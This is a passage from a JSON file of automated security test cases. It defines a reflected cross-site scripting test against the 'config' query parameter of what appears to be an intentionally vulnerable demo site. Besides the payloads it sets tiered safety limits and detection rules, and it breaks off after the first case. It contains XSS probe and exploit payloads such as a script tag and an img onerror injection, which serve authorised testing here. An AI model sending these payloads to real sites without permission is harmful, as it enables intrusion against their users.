{
  "test_cases": [
    {
      "id": "TC-H1-query-reflected-xss-home-config",
      "hypothesis_id": "H1-query-reflected-xss-home-config",
      "base_url": "https://brokencrystals.com",
      "method": "GET",
      "endpoint": "/",
      "parameter": "config",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "query",
              "value": "default"
            }
          ],
          "description": "Baseline request to capture normal response"
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "\"><script>0</script>"
            }
          ],
          "description": "Non-destructive probe payload to detect reflection in HTML/script contexts",
          "content_type": "application/x-www-form-urlencoded"
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "query",
              "value": "\"><img src=x onerror=alert(1)>"
            }
          ],
          "description": "Payload intended to trigger XSS if reflected unsanitized in HTML context",
          "content_type": "application/x-www-form-urlencoded"
        },
        {
          "tier": "destructive",
          "payloads": [
            {
              "location": "query",
              "value": ""
            }
          ],
          "description": "No destructive payloads allowed per safety"
        }
      ],
      "prerequisites": [
        {
          "type": "session_state",
          "description": "Use observed session cookie if available",
          "bind_to": "connect.sid"
        },
        {
          "type": "custom",
          "description": "Capture baseline response body and headers for comparison"
        }
      ],
      "oracle_rules": [
        {
          "signal": "reflected_input",
          "condition": "payload_value in response.body",
          "threshold": {
            "body_length_delta_pct": 30.0,
            "expected_codes": [
              200
            ]
          },
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "abs(len(response.body) - len(baseline.body)) / max(1,len(baseline.body)) > 0.25",
          "threshold": {
            "body_length_delta_pct": 25.0,
            "expected_codes": [
              200
            ]
          },
          "weight": 0.8
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 50
      },
      "max_retries": 2,
      "delay_between_requests": 1.5,
      "notes": "Start with benign baseline. Rate-limit requests to avoid triggering protections. Maintain session cookie if present.",
      "tags": [
        "xss",
        "reflection",
        "query"
      ],
      "estimated_duration": 300
    },
